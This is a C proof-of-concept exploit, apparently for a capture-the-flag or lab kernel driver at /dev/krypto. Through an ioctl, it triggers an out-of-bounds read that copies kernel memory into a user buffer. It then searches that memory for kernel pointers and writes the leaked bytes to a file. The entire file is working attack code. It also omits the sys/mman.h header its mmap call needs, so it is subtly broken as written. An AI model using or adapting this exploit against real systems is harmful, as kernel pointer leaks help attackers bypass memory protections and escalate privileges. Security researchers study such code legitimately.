#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define KRYPTO_RNG_CMD 0x1337

struct rng_params {
    char *buf;
    size_t buf_len;
};

void hexdump(void *ptr, int buflen) {
    unsigned char *buf = (unsigned char*)ptr;
    for (int i = 0; i < buflen; i += 16) {
        printf("%06x: ", i);
        for (int j = 0; j < 16; j++) {
            if (i+j < buflen)
                printf("%02x ", buf[i+j]);
            else
                printf("   ");
        }
        printf(" ");
        for (int j = 0; j < 16; j++) {
            if (i+j < buflen) {
                char c = buf[i+j];
                printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
        }
        printf("\n");
    }
}

int main() {
    int fd = open("/dev/krypto", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Allocate a small buffer (0x100 bytes)
    char *buf = malloc(0x100);
    if (!buf) {
        perror("malloc");
        close(fd);
        return 1;
    }
    memset(buf, 'A', 0x100);

    // Create larger pages to capture potential leaks
    char *leak_buf = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, 
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (leak_buf == MAP_FAILED) {
        perror("mmap");
        free(buf);
        close(fd);
        return 1;
    }

    // Setup parameters for the ioctl
    struct rng_params params = {
        .buf = leak_buf,
        .buf_len = 0x1000  // Request larger than allocated
    };

    printf("Before ioctl - Memory at leak_buf:\n");
    hexdump(leak_buf, 0x200);

    // Trigger the vulnerability
    int ret = ioctl(fd, KRYPTO_RNG_CMD, &params);
    printf("\nioctl returned: %d\n\n", ret);

    printf("After ioctl - Memory at leak_buf:\n");
    hexdump(leak_buf, 0x1000);

    // Look for potential kernel pointers (addresses starting with 0xffff)
    printf("\nSearching for kernel pointers...\n");
    for (int i = 0; i < 0x1000-7; i++) {
        unsigned long *ptr = (unsigned long*)&leak_buf[i];
        if ((*ptr & 0xffff000000000000) == 0xffff000000000000) {
            printf("Possible kernel pointer at offset 0x%x: %016lx\n", i, *ptr);
        }
    }

    // Save leaked data to file
    FILE *f = fopen("leaked_data.bin", "wb");
    if (f) {
        fwrite(leak_buf, 1, 0x1000, f);
        fclose(f);
    }

    // Cleanup
    munmap(leak_buf, 0x2000);
    free(buf);
    close(fd);

    return 0;
}

